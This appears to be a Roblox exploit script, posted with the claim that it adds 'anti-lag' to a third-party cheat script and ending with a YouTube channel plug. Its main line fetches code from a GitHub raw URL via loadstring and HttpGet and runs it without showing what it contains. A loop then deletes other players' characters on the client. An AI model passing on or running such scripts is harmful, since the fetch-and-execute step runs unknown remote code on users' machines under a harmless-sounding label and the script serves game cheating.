---- I added anti-lag in the ToraIsMe script
wait(10)
 print("script loaded!")
wait(2)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraScript/Script/main/summer2024", true))()
wait(1) 
 _G.HideAll = true
while _G.HideAll and  task.wait() do

for i,v in pairs(game.Players:GetPlayers()) do
if v.Name ~= game.Players.LocalPlayer.Name and v.Character then
v.Character:Destroy()
end
end
end
wait(2) 
print("Subscribe to my YouTube Edgar666")
